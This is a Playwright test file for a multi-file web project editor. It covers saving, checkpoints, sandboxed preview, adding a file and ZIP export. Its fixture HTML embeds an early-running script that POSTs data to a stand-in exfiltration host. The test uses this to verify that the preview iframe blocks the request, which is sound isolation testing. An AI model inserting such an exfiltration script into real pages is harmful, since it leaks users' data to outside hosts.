import { test, expect } from '@playwright/test';

const projectId = '11111111-1111-4111-8111-111111111111';
const projectPath = '/api/magnanimous/vibe-studio/projects/' + projectId;
const initialHtml = '<!doctype html><script>document.documentElement.dataset.vibeEarlyScript="ran";fetch("https://vibe-preview-exfil.test/collect",{method:"POST",mode:"no-cors",body:"preview-isolation-probe"}).catch(()=>{});</script><html><head><title>Magnanimous preview test</title></head><body><h1>Demo preview</h1></body></html>';

test('owner multi-file Vibe Studio saves, previews, checkpoints, adds and exports a project', async ({ page }) => {
  const files = [
    { path: 'styles.css', content: 'body { color: rgb(1, 2, 3); }', revision: 1, created_at: 1, updated_at: 1 },
    { path: 'app.js', content: "document.body.dataset.fixtureSample = String(window.MAGNANIMOUS_FIXTURES['fixtures/demo.json'].sample);", revision: 1, created_at: 1, updated_at: 1 },
    { path: 'fixtures/demo.json', content: '{"sample":7}', revision: 1, created_at: 1, updated_at: 1 },
    { path: 'notes.md', content: '# Local notes', revision: 1, created_at: 1, updated_at: 1 },
  ];
  const histories: Record<string, Array<{ revision: number; note: string; created_at: number }>> = Object.fromEntries(
    files.map((file) => [file.path, [{ revision: 1, note: 'Initial file', created_at: 1 }]]),
  );
  let project = {
    id: projectId,
    title: 'Demo project',
    brief: 'A safe local multi-file preview fixture.',
    template: 'landing',
    revision: 1,
    updated_at: 1,
    html: initialHtml,
  };

  await page.addInitScript(() => {
    localStorage.setItem('magnanimous_admin_token', 'qa-owner-token');
  });

  let exfiltrationRequests = 0;
  await page.route('https://vibe-preview-exfil.test/**', async (route) => {
    exfiltrationRequests += 1;
    await route.fulfill({ status: 204, body: '' });
  });

  await page.route('**/api/magnanimous/vibe-studio/**', async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    const path = url.pathname;
    const method = request.method();

    if (path === '/api/magnanimous/vibe-studio/projects' && method === 'GET') {
      await route.fulfill({ json: { projects: [{ ...project, html: undefined }] } });
      return;
    }
    if (path === projectPath && method === 'GET') {
      await route.fulfill({
        json: {
          project,
          versions: [{ revision: 1, note: 'Initial project', created_at: 1 }],
        },
      });
      return;
    }
    if (path === projectPath + '/files' && method === 'GET') {
      await route.fulfill({ json: { files, limits: { max_files: 20, max_file_bytes: 65536, max_project_bytes: 262144, used_bytes: 0 } } });
      return;
    }
    if (path === projectPath + '/files' && method === 'POST') {
      const body = request.postDataJSON() as { path: string; content: string };
      if (files.some((file) => file.path === body.path)) {
        await route.fulfill({ status: 409, json: { detail: 'That file already exists.' } });
        return;
      }
      const stamp = 2;
      const created = { path: body.path, content: body.content, revision: 1, created_at: stamp, updated_at: stamp };
      files.push(created);
      histories[body.path] = [{ revision: 1, note: 'Created file', created_at: stamp }];
      await route.fulfill({ status: 201, json: { file: created, saved: true, production_published: false } });
      return;
    }
    if (path === '/api/magnanimous/vibe-studio/review' && method === 'POST') {
      await route.fulfill({ json: { valid: true, issues: [] } });
      return;
    }
    if (path.startsWith(projectPath + '/files/')) {
      const suffix = path.slice((projectPath + '/files/').length);
      if (method === 'GET' && suffix.endsWith('/versions')) {
        const filePath = decodeURIComponent(suffix.slice(0, -'/versions'.length));
        await route.fulfill({ json: { versions: histories[filePath] || [] } });
        return;
      }
      if (method === 'PUT') {
        const filePath = decodeURIComponent(suffix);
        const body = request.postDataJSON() as { content: string; expected_revision: number; note?: string };
        const current = files.find((file) => file.path === filePath);
        if (!current) {
          await route.fulfill({ status: 404, json: { detail: 'File not found.' } });
          return;
        }
        if (body.expected_revision !== current.revision) {
          await route.fulfill({ status: 409, json: { detail: 'A newer file checkpoint exists.' } });
          return;
        }
        current.content = body.content;
        current.revision += 1;
        current.updated_at = 3;
        histories[filePath].unshift({ revision: current.revision, note: body.note || 'Edited file', created_at: 3 });
        await route.fulfill({ json: { file: current, saved: true, production_published: false } });
        return;
      }
    }

    await route.fulfill({ status: 404, json: { detail: 'Unexpected Vibe Studio test request: ' + method + ' ' + path } });
  });

  await page.goto('/vibe-studio/files/', { waitUntil: 'domcontentloaded' });
  await expect(page.getByRole('heading', { name: 'Multi-file workspace' })).toBeVisible();
  await expect(page.getByRole('heading', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('button', { name: /styles\.css/ })).toBeVisible();

  await page.getByRole('button', { name: /styles\.css/ }).click();
  const editor = page.getByRole('textbox', { name: 'Edit styles.css' });
  await expect(editor).toHaveValue('body { color: rgb(1, 2, 3); }');
  await editor.fill('body { color: rgb(12, 34, 56); }');
  await page.getByRole('button', { name: 'Save file' }).click();
  await expect(page.getByRole('status')).toContainText('Saved styles.css as a new immutable checkpoint.');
  await expect(page.locator('.vibeFilesToolbar')).toContainText('Revision 2');

  await page.getByRole('button', { name: /Preview/ }).click();
  const preview = page.frameLocator('iframe[title="Magnanimous multi-file preview"]');
  await expect(preview.locator('html')).toHaveAttribute('data-vibe-early-script', 'ran');
  await expect.poll(() => exfiltrationRequests).toBe(0);
  await expect(preview.locator('h1')).toHaveText('Demo preview');
  await expect(preview.locator('body')).toHaveAttribute('data-fixture-sample', '7');
  await expect.poll(() => preview.locator('body').evaluate((element) => getComputedStyle(element).color)).toBe('rgb(12, 34, 56)');

  await page.getByLabel('New file path').fill('src/extra.js');
  await page.getByRole('button', { name: /Add file/ }).click();
  await expect(page.getByRole('status')).toContainText('Created src/extra.js.');
  await expect(page.getByRole('button', { name: /src\/extra\.js/ })).toBeVisible();

  const downloadPromise = page.waitForEvent('download');
  await page.getByRole('button', { name: /Export ZIP/ }).click();
  const download = await downloadPromise;
  expect(download.suggestedFilename()).toBe('demo-project.zip');

  await page.setViewportSize({ width: 390, height: 844 });
  await expect(page.getByRole('heading', { name: 'Multi-file workspace' })).toBeVisible();
  await expect(page.getByRole('button', { name: /Preview/ })).toBeVisible();
  await expect(page.getByRole('textbox', { name: /Edit src\/extra\.js/ })).toBeVisible();
  const mobileWidth = await page.locator('html').evaluate((element) => ({
    clientWidth: element.clientWidth,
    scrollWidth: element.scrollWidth,
  }));
  expect(mobileWidth.scrollWidth).toBeLessThanOrEqual(mobileWidth.clientWidth + 1);
});
